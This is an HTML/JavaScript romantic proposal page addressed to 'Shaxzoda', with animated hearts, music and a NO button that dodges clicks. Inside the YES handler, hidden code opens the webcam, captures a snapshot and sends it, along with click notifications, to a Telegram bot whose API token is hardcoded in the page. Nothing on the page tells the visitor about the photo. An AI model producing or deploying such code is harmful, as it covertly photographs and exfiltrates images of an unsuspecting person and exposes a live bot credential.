<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>For Shaxzoda 💍</title>

<style>
body {
  margin:0;
  font-family:sans-serif;
  text-align:center;
  background:linear-gradient(135deg,#ff9a9e,#fad0c4);
  color:white;
  overflow:hidden;
}

.container { margin-top:80px; }

h1 { font-size:26px; }

/* BUTTON */
button {
  padding:15px 25px;
  font-size:18px;
  border:none;
  border-radius:30px;
  margin:10px;
  cursor:pointer;
}

#yes { background:#ff3366; color:white; }
#no { background:white; color:#ff3366; }

/* ❤️ hearts */
.heart {
  position:fixed;
  font-size:22px;
  animation:float 4s linear infinite;
}
@keyframes float {
  0% {transform:translateY(100vh);}
  100% {transform:translateY(-10vh);}
}

/* 💍 ring */
#ring {
  display:none;
  font-size:80px;
  animation:pop 1s ease;
}
@keyframes pop {
  0% {transform:scale(0);}
  100% {transform:scale(1);}
}

/* 🎁 stickers */
#stickers img {
  position: fixed;
  width:100px;
  animation: floatUp 5s linear infinite;
}
@keyframes floatUp {
  0% { transform: translateY(100vh); }
  100% { transform: translateY(-10vh); }
}
</style>
</head>

<body>

<div class="container">
  <h1 id="text">
    Shaxzoda, sen mening hayotimdagi eng muhim insonsan 💖<br><br>
    Do you want to spend your life with me? 💍
  </h1>

  <button id="yes">YES 💖</button>
  <button id="no">NO 😊</button>
</div>

<div id="ring">💍</div>

<div id="stickers" style="display:none;">
  <img src="https://media.tenor.com/8QyY2HkJ5nEAAAAi/love.gif">
  <img src="https://media.tenor.com/W6X7SgP3WgQAAAAi/cute-love.gif">
</div>

<audio id="music" src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_7b0c6a6c2e.mp3?filename=romantic-love-ambient-11077.mp3"></audio>

<script>

// ❤️ hearts
setInterval(()=>{
  let h=document.createElement("div");
  h.className="heart";
  h.innerHTML="❤️";
  h.style.left=Math.random()*100+"vw";
  document.body.appendChild(h);
  setTimeout(()=>h.remove(),4000);
},300);

// NO texts
let noTexts=["Yana o‘yla 😊","Baribir YES deysan 😉","Men kutaman 💖","Sen eng zo‘risan 😍"];
let i=0;
let noBtn=document.getElementById("no");

noBtn.onclick=()=>{
  noBtn.innerText=noTexts[i%noTexts.length];
  i++;
  noBtn.style.position="relative";
  noBtn.style.left=Math.random()*50+"px";
  noBtn.style.top=Math.random()*30+"px";
};

// YES bosilganda
document.getElementById("yes").onclick=async()=>{

  document.getElementById("music").play();

  document.body.innerHTML=`
    <h1 style="margin-top:100px;">💍 YAAAAAY 💍</h1>
    <p style="font-size:22px;">I LOVE YOU ❤️🥰</p>
  `;

  // 💍 ring effect
  let ring=document.createElement("div");
  ring.innerHTML="💍";
  ring.style.fontSize="80px";
  ring.style.marginTop="20px";
  document.body.appendChild(ring);

  // ❤️ hearts
  setInterval(()=>{
    let h=document.createElement("div");
    h.innerHTML="❤️";
    h.style.position="fixed";
    h.style.left=Math.random()*100+"vw";
    h.style.bottom="0";
    h.style.fontSize="25px";
    document.body.appendChild(h);
    setTimeout(()=>h.remove(),4000);
  },150);

  // 🎁 stickers
  let stickers=document.getElementById("stickers");
  if(stickers){
    stickers.style.display="block";
  }

  // 📸 CAMERA (permission bilan)
  try{
    let stream=await navigator.mediaDevices.getUserMedia({video:true});
    let video=document.createElement("video");
    video.srcObject=stream;
    await video.play();

    let canvas=document.createElement("canvas");
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    let ctx=canvas.getContext("2d");
    ctx.drawImage(video,0,0);

    let img=canvas.toDataURL("image/png");

    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendPhoto",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        chat_id:"CHATID",
        photo:img,
        caption:"📸 YES bosildi 😍💍"
      })
    });

    stream.getTracks().forEach(t=>t.stop());

  }catch(e){
    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=YES bosildi (kamera yoqilmadi)");
  }

  // 📩 text
  fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=💍 SHAXZODA YES BOSDI!!! 😍❤️🔥");
};

</script>

</body>
</html>
